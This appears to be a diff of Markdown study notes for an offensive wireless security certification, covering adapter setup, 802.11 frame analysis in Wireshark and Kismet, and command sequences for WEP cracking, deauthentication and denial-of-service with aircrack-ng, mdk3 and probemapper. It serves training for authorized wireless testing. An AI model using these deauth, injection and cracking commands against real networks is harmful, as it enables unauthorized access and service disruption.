@@ -1,6 +1,6 @@
 # OSWA God-Tier Notes by Optixal
 
-## Contents
+## Book Contents
 1. Introduction: Pg 4 - 20
 2. RF Spectrum: Pg 23 - 45
 3. Wireless Protocols, Equipment & Security: Pg 49 - 131
@@ -130,19 +130,13 @@ AP shows its SSID in frame beacons.
 #### Wireless NICs and Chipsets
 When doing wireless auditing, the chipset is important. Brand doesn’t matter. Need a chipset that is supported natively under Linux.
 
-##### Modes:
-* Ad-Hoc Mode
-* Managed Mode
-* Monitor Mode : WNIC operates in RFMON mode. For sniffing frames.
-* Master Mode : WNIC operates as AP. Useful for testing wireless client security
-
 ### Commands for Setting Up Wifi Adapter
 
 #### Command to Find Out Wireless Chipset Info
 * `airmon-ng`
 * `dmesg | less`
-* `lspci –vv | less` (for PCI cards)
-* `lsusb –vv | less` (for USB)
+* `lspci -vv | less` (for PCI cards)
+* `lsusb -vv | less` (for USB)
 
 #### Chipset Prefixes
 * Ralink Chipsets - "rt"
@@ -150,45 +144,78 @@ When doing wireless auditing, the chipset is important. Brand doesn’t matter. 
 * Atheros Chipsets - "ar"
 
 #### Find Out Supported Parameters for `iwpriv`
-`iwpriv wlan0`
+`iwpriv [interface]`
 
 #### Setting Frequency Band of Wireless NIC
-`iwpriv wlan0 mode 3`
+`iwpriv [interface] mode 3`
 
 * Mode 3 is for 802.11g
 * Mode 2 is for 802.11b
 * Mode 1 is for 802.11a
 
-#### Commands For Changing Modes on Non-Atheros Chipsets:
+#### Modes
+`iwconfig [interface]`
 
-* `ifconfig wlan0 down`
-* `iwpriv wlan0 mode 3`, 3 for "G" band. Card may not support this, and may use this by default already.
-* `ifconfig wlan0 up`
-* `iwconfig wlan0 mode monitor` or `iwconfig wlan0 mode master`
-* `iwconfig wlan0 channel [target]`
+* Ad-Hoc Mode
+* Managed Mode
+* Monitor Mode : WNIC operates in RFMON mode. For sniffing frames.
+* Master Mode : WNIC operates as AP. Useful for testing wireless client security
 
-#### Commands For Changing Modes on Atheros Chipsets:
+#### Commands For Changing Band and Mode on Non-Atheros Chipsets:
+* `ifconfig [interface] down`
+* `iwpriv [interface] mode 3`, 3 for "G" band. Card may not support this, and may use this by default already.
+* `ifconfig [interface] up`
+* `iwconfig [interface] mode monitor` or `iwconfig [interface] mode master`
+* `iwconfig [interface] channel [target]`
 
+#### Commands For Changing Band and Mode on Atheros Chipsets:
 * `wlanconfig ath0 destroy`
 * `wlanconfig ath0 create wlandev wifi0 wlanmode monitor` or `wlanconfig ath0 create wlandev wifi0 wlanmode master`
-* `iwconfig wlan0 channel [target]`
+* `iwconfig [interface] channel [target]`
 
 #### Frame Injection
 For Ralink chipsets, additional commands are required to enable frame injection:
-1. `iwpriv wlan0 forceprism 1`
-2. `iwpriv wlan0 rfmontx 1`
+1. `iwpriv [interface] forceprism 1`
+2. `iwpriv [interface] rfmontx 1`
 
 Visit http://linux-wless.passys.nl to check native Linux support for wireless chipsets.
 
-#### Associate with an Open AP with SSID "oswa"
-1. Connect with `iwconfig wlan0 essid oswa`, requires "Managed" mode.
+#### Associate with an Open AP with SSID oswa
+1. Connect with `iwconfig [interface] essid oswa`, requires "Managed" mode.
 2. Check if BSSID is listed with `iwconfig`.
 3. If BSSID is not listed, do one of the following to get associated:
-  * `ifconfig wlan0`
-  * `pump -i wlan0`
-  * `dhclient wlan0`
-4. The channel should be auto-set when associating an AP. To set channel manually with `iwconfig wlan0 channel 6`.
-5. To display more wireless info, use `iwlist wlan0 scanning`.
+  * `ifconfig [interface]`
+  * `pump -i [interface]`
+  * `dhclient [interface]`
+4. The channel should be auto-set when associating an AP. To set channel manually with `iwconfig [interface] channel 6`.
+5. To display more wireless info, use `iwlist [interface] scanning`.
+
+#### Associate with a WEP AP with SSID oswa with Non-Atheros Chipset
+1. `iwconfig [interface] mode managed`
+2. `iwconfig [interface] essid [Name of AP]`
+3. `iwconfig [interface] channel [Channel of AP]`
+4. `iwconfig [interface] key [1-4] [WEP Key]`
+5. `iwconfig [interface] key [1-4]`
+6. `iwconfig [interface] enc on`
+7. `pump -i [interface]`
+
+#### Associate with a WEP AP with SSID oswa with Atheros Chipset
+1. `wlanconfig [interface] destroy`
+2. `wlanconfig [interface] create wlandev wifi0 wlanmode managed`
+3. `iwconfig [interface] essid [Name of AP]`
+4. `iwconfig [interface] channel [Channel of AP]`
+5. `iwconfig [interface] key [1-4] [WEP Key]`
+6. `iwconfig [interface] key [1-4]`
+7. `iwconfig [interface] enc on`
+8. `pump -i [interface]`
+
+#### Associate with a WPA AP
+> WB Pg 47 and Pg 81
+
+#### If No DHCP Server Available
+1. Find IP range, netmask and gateway using Wireshark in promiscuous mode with IEEE 802.11 decryption
+2. `ifconfig [interface] [Static IP] netmask [Subnet Mask]`
+3. `route add -net 0.0.0.0 gw [Gateway IP]`
 
 ### Wireless Frame
 
@@ -201,30 +228,92 @@ Visit http://linux-wless.passys.nl to check native Linux support for wireless ch
 
 #### Frame Control Header Types and Subtypes
 
-| Type Value (b3 b2) | Type Description | Subtype Description | Subtype Value (b7 b6 b5 b4)
-| ------------------ | ---------------- | ------------------- | ----------------------------
-| 00 | Management Frames | Probe Request | 0100
-| 00 | Management Frames | Probe Response | 0101
-| 00 | Management Frames | Association Request | 0000
-| 00 | Management Frames | Association Response | 0001
-| 00 | Management Frames | Authentication | 1011
-| 00 | Management Frames | Disassociation | 1010
-| 00 | Management Frames | Deauthentication | 1100
-| 00 | Management Frames | Beacon | 1000
-| 00 | Management Frames | Reassociation Request | 0010
-| 00 | Management Frames | Reassociation Response | 0011
+| Type Value | Type Description | Subtype Description | Subtype Binary Value | Hex Value |
+| ---------- | ---------------- | ------------------- | -------------------- | --------- |
+| 00 | Management Frames | Association Request | 0000 | 0x00
+| 00 | Management Frames | Association Response | 0001 | 0x01
+| 00 | Management Frames | Reassociation Request | 0010 | 0x02
+| 00 | Management Frames | Reassociation Response | 0011 | 0x03
+| 00 | Management Frames | Probe Request | 0100 | 0x04
+| 00 | Management Frames | Probe Response | 0101 | 0x05
+| 00 | Management Frames | Beacon | 1000 | 0x08
+| 00 | Management Frames | Disassociation | 1010 | 0x0A
+| 00 | Management Frames | Authentication | 1011 | 0x0B
+| 00 | Management Frames | Deauthentication | 1100 | 0x0C
 | 01 | Control Frames | |
 | 10 | Data Frames | |
 | 11 | Reserverd Frames | |
 
-##### Wireshark Filters
+##### Getting Information Using Wireshark
+
+###### Wireshark Filters
 * To find beacon frames, filter by `wlan.fc.type_subtype == 0x08`.
 * To find management frames, filter by `wlan.fc.type == 0x00`.
 * To find control frames, filter by `wlan.fc.type == 0x01`.
 * To find data frames, filter by `wlan.fc.type == 0x02`.
 * To find ToDS frames, filter by `wlan.fc.tods == 1`.
 * To find FromDS frames, filter by `wlan.fc.fromds == 1`.
-* To find custom DS frames, filter by `wlan.fc.ds == 0x00`, where `00` is the DS signature.
+* To find custom DS frames, filter by `wlan.fc.ds == 0x00`, where `0x01` is ToDS and `0x02` is FromDS.
+
+###### Checking for Frame-Level Encryption
+* HTTP GET requests and responses in plaintext.
+* Check beacon frame or data frame:
+  * "Protected Bit" in "Frame Control" - 0: No Encryption, 1: Encrypted
+  * "Privacy Bit" in "Capbility Information" - 0: No WEP, 1: Supports WEP
+
+Alternatively, use airodump-ng and check "ENC" and "CIPHER" columns (more detailed) or Kismet's "W" column (less detailed).
+
+###### Finding SSID of AP From Beacons
+* Check in beacon frame.
+* Check for probe requests and probe responses.
+
+###### Finding SSID of AP From Client Probe Requests
+* Capture packets in monitor mode and write them out to a PCAP file.  
+`airodump-ng [interface] -w [file]`
+
+* Open PCAP file in Wireshark.  
+`wireshark -r [file]`
+
+* Filter by probe requests made by a certain client.  
+`wlan.fc.subtype == 0x04 && wlan.addr == [MAC of Client]`
+
+* Select probe request frame
+* Navigate to "IEEE 802.11 wireless LAN management frame" > "Tagged Parameters" > "SSID parameter set"
+* SSID of AP the client is probing for should be displayed in "Tag interpretation"
+
+Alternatively, use Wireshark's "WLAN Traffic Statistics" to view resolved SSIDs and probe requests by going to "Statistics" > "WLAN Traffic...". (Inaccurate at times)
+
+###### Finding Supported Bandwidth Rates of an AP
+
+* Filter by **responses** from certain AP (Probe, Association, Reassociation, and including Beacons)  
+`wlan.fc.subtype == [subtype hex] && wlan.addr == [MAC of AP]`
+
+* Select frame
+* Navigate to "IEEE 802.11 wireless LAN management frame" > "Tagged Parameters"
+* The supported bandwidth rates should be displayed in "Supported Rates"
+
+###### Decrypt Encrypted Packets On-The-Fly
+1. Edit > Preferences > Protocols > IEEE 802.11
+2. Check "Reassemble fragmented 802.11 datagrams.
+3. Check "Enable decryption".
+4. Paste key (in a certain format depending on type) into the key input box.
+
+##### Getting Information Using Kismet
+
+##### Kismet Setup
+1. Wireless Applications > 802.11 > Kismet > setup kismet-server
+2. Find line starting with "source=".
+3. Modify according to your interface and driver (eg. "source=rtl8180,wlan0,wlan0" or "source=rt2500,ar0,ar0")
+   * Refer to "12. Capture Sources" in "/usr/local/apps/wifi/kismet/etc/README" to find compatible drivers.
+
+##### Start Kismet
+1. Wireless Applications > 802.11 > Kismet > kismet
+2. `ss` to sort list in alphabetical order
+
+![How to interpret Kistmet interface](/kismet.jpg?raw=true)
+
+##### Kismet Packet Capture
+Kismet will automatically capture packets into a PCAP file (only if started from menu) which can be found in "/usr/local/apps/wifi/kismet/bin".
 
 ##### How a Client Associates with an AP
 1. Client sends **Probe Request** to AP.
@@ -247,6 +336,7 @@ Visit http://linux-wless.passys.nl to check native Linux support for wireless ch
 #### Wireless Sniffers
 * Kismet
 * Airodump-ng
+* Wireshark
 
 #### 802.11i
 802.11i covers wireless security.
@@ -265,6 +355,7 @@ Visit http://linux-wless.passys.nl to check native Linux support for wireless ch
 ##### WPA Types
 * WPA-PSK (Pre-Shared Key)
 * WPA Enterprise
+* (Both uses TKIP)
 
 ##### WPA2 Types
 * WPA2-PSK
@@ -296,8 +387,8 @@ Visit http://linux-wless.passys.nl to check native Linux support for wireless ch
 #### Prep Chipsets (Monitor Mode and Frame Injection)
 * Set Wifi adapters to monitor mode by referring to "Commands For Changing Modes on Chipsets" in previous chapter.
 * Don't forget, for Ralink chipsets, additional commands are required to enable frame injection:
-  1. `iwpriv wlan0 forceprism 1`
-  2. `iwpriv wlan0 rfmontx 1`
+  1. `iwpriv [interface] forceprism 1`
+  2. `iwpriv [interface] rfmontx 1`
 
 #### Test Injection and Quality
 `aireplay-ng --test [interface]`
@@ -314,7 +405,7 @@ Visit http://linux-wless.passys.nl to check native Linux support for wireless ch
 * Deauths client to force the client to reconnect and make an ARP request.  
 `aireplay-ng --deauth 500 -a [MAC of AP] -c [Client's MAC] [interface]`
 
-* Captures ARP requests and replays them to generate more ARP traffic. Do with fakeauth.  
+* Captures ARP requests and replays them to generate more ARP traffic. Do with **fakeauth**.  
 `aireplay-ng --arpreplay -b [MAC of AP] -h [Client's MAC] [interface]`
 
 * Write out pcap file with captured ARP data packets and IVs. Do with inject. Successful when "Data" column in airodump rapidly goes up.  
@@ -325,16 +416,16 @@ Visit http://linux-wless.passys.nl to check native Linux support for wireless ch
 * Get ESSID, BSSID, Client's MAC, Channel.  
 `airodump-ng [interface]`
 
-* Attempt to associate with AP. Successful when "Association successful :)" appears and stays, with no deauthentication messages.  
+* Attempt to associate with AP. Successful when "Association successful :)" **appears** and **stays**, with no deauthentication messages.  
 `aireplay-ng --fakeauth 0 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`
 `aireplay-ng --fakeauth 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`  
 `aireplay-ng --fakeauth 5000 -o 1 -q 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`  
 `aireplay-ng --fakeauth 20 -o 1 -q 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`
 
-* Captures ARP requests and replays them to generate more ARP traffic. Do with fakeauth.  
+* Captures ARP requests and replays them to generate more ARP traffic. Do with **fakeauth**.  
 `aireplay-ng --arpreplay -b [MAC of AP] -h [Our/Client's MAC] [interface]`
 
-* Write out pcap file with captured ARP data packets and IVs. Do with fakeauth and inject. Successful when "Data" column in airodump rapidly goes up.  
+* Write out pcap file with captured ARP data packets and IVs. Do with **fakeauth** and inject. Successful when "Data" column in airodump rapidly goes up.  
 `airodump-ng --bssid=[MAC of AP] -c [channel] -w [filename] [interface]`
 
 ###### No Client Associated Method 2 - Interactive Replay Attack (May require MAC of previously-seen-associated victim) (May require changing own MAC to victim's, refer below*)
@@ -342,15 +433,15 @@ Visit http://linux-wless.passys.nl to check native Linux support for wireless ch
 * Get ESSID, BSSID, Client's MAC, Channel.  
 `airodump-ng [interface]`
 
-* Attempt to associate with AP. Successful when "Association successful :)" appears and stays, with no deauthentication messages.  
+* Attempt to associate with AP. Successful when "Association successful :)" **appears** and **stays**, with no deauthentication messages.  
 `aireplay-ng --fakeauth 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`  
 `aireplay-ng --fakeauth 5000 -o 1 -q 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`  
 `aireplay-ng --fakeauth 20 -o 1 -q 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`
 
-* Captures data frames and reinjects them to generate more traffic. Reply 'y' when prompted to reinject. Do with fakeauth.  
+* Captures data frames and reinjects them to generate more traffic. Reply 'y' when prompted to reinject. Do with **fakeauth**.  
 `aireplay-ng --interactive -b [MAC of AP] -d FF:FF:FF:FF:FF:FF -m 68 -n 68 -p 0841 -h [Our/Client's MAC] [interface]`
 
-* Write out pcap file with captured data packets and IVs. Do with fakeauth and inject. Successful when "Data" column in airodump rapidly goes up.  
+* Write out pcap file with captured data packets and IVs. Do with **fakeauth** and inject. Successful when "Data" column in airodump rapidly goes up.  
 `airodump-ng --bssid=[MAC of AP] -c [channel] -w [filename] [interface]`
 
 ###### No Client Associated Method 3 - PRGA Packetforge Interactive Attack (May require MAC of previously-seen-associated victim) (May require changing own MAC to victim's, refer below*)
@@ -358,22 +449,22 @@ Visit http://linux-wless.passys.nl to check native Linux support for wireless ch
 * Get ESSID, BSSID, Client's MAC, Channel.  
 `airodump-ng [interface]`
 
-* Attempt to associate with AP. Successful when "Association successful :)" appears and stays, with no deauthentication messages.  
+* Attempt to associate with AP. Successful when "Association successful :)" **appears** and **stays**, with no deauthentication messages.  
 `aireplay-ng --fakeauth 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`  
 `aireplay-ng --fakeauth 5000 -o 1 -q 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`  
 `aireplay-ng --fakeauth 20 -o 1 -q 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`
 
-* Captures data frames and attempts to obtain PRGA from AP by reinjecting and generating more traffic. Stores PRGA in a ".xor" file in current dir. Reply 'y' when prompted to reinject. May require few attempts with different packets, better with FromDS: 1. Do with fakeauth.  
+* Captures data frames and attempts to obtain PRGA from AP by reinjecting and generating more traffic. Stores PRGA in a ".xor" file in current dir. Reply 'y' when prompted to reinject. May require few attempts with different packets, better with FromDS: 1. Do with **fakeauth**.  
 `aireplay-ng --fragment -b [MAC of AP] -h [Our/Client's MAC] [interface]`  
 `aireplay-ng --chopchop -b [MAC of AP] -h [Our/Client's MAC] [interface]`
 
 * Forge an ARP request packet using PRGA xor file
 `packetforge-ng --arp -a [MAC of AP] -h [Our/Client's MAC] -l 255.255.255.255 -k 255.255.255.255 -y [.xor PRGA File] -w [filename]`
 
-* Inject forged ARP packet, causing AP to generate traffic. Do whith fakeauth.
+* Inject forged ARP packet, causing AP to generate traffic. Do with **fakeauth**.
 `aireplay-ng --interactive -r [filename from prev step] [interface]`
 
-* Write out pcap file with captured data packets and IVs. Do with fakeauth and inject. Successful when "Data" column in airodump rapidly goes up.  
+* Write out pcap file with captured data packets and IVs. Do with **fakeauth** and inject. Successful when "Data" column in airodump rapidly goes up.  
 `airodump-ng --bssid=[MAC of AP] -c [channel] -w [filename] [interface]`
 
 ###### *Changing MAC Address (Required when AP uses MAC filtering)
@@ -446,3 +537,18 @@ Visit http://linux-wless.passys.nl to check native Linux support for wireless ch
 `mdk3 [interface] d -b [blacklist w/ AP MACs] -c [channel]` (deauth networks listed in blacklist)  
 `mdk3 [interface] a -i [MAC of AP]` (authentication dos a certain AP)
 
+#### Probemapper
+
+* Find name of driver to use.  
+`probemapper`
+
+* Mass client profile, find a certain target and record the MAC.
+`probemapper -i [interface] -d [driver name] -s -c 1`
+
+* Target that client  
+`probemapper -i [interface] -d [driver name] -s -t [MAC of target]
+
+## Resources
+
+* http://linux-wless.passys.nl - Chipset Lookup
+* http://www.macvendorlookup.com - MAC Vendor Lookup
